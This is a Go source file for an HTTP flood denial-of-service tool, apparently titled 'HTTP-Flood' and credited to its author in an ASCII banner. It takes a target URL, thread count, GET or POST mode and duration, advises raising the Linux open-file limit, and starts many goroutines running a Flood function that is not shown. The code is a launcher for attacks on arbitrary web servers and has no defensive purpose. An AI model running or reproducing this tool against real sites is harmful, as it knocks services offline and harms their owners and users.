package ddos

import (
	"bufio"
	"fmt"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)


func Ddos() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||                     Golang version 2.0      ")
	fmt.Println("                                                        C0d3d By L330n123")
	fmt.Println("==========================================================================")
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("Please input a correct url")
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use \"get\" or \"post\"")
		return
	}
	mode = os.Args[3]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
	}
	if Contain(page, "?") == 0 {
		key = "?"
	} else {
		key = "&"
	}
	input := bufio.NewReader(os.Stdin)

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go Flood() // Start threads
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
		//time.Sleep( time.Millisecond * 1)
	}
	fmt.Printf("\nPlease [Enter] for continue")
	_, err = input.ReadString('\n')
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")

	time.Sleep(time.Duration(limit) * time.Second)
	//Keep the threads continue
}